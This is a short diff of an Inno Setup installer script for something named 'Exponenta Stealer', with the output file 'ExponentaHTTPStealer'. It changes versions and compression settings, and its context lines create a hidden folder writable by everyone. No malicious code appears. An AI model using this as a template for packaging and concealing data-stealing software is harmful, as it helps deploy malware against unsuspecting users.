@@ -5,19 +5,22 @@
 
 [Setup]
 AppName=Exponenta Stealer Main Files
-AppVersion=1.5.1
+AppVersion=1.6.4.1
 AllowRootDirectory=yes
 AllowCancelDuringInstall=yes
 ArchitecturesAllowed=x86 x64
 Compression=lzma2/max
 DefaultDirName={%PUB1|c:\pub1}
-MinVersion=6.0.6001
+MinVersion=0,5.01.2600sp3
 SetupLogging=yes
 UsePreviousAppDir=yes
 DisableStartupPrompt=yes
 Output=yes
 OutputDir=d:\Download
 OutputBaseFilename=ExponentaHTTPStealer
+RestartIfNeededByRun=False
+VersionInfoVersion=1.6.4.1
+SolidCompression=True
 
 [Dirs]
 Name: {app}\Util; Attribs: hidden; Permissions: everyone-full
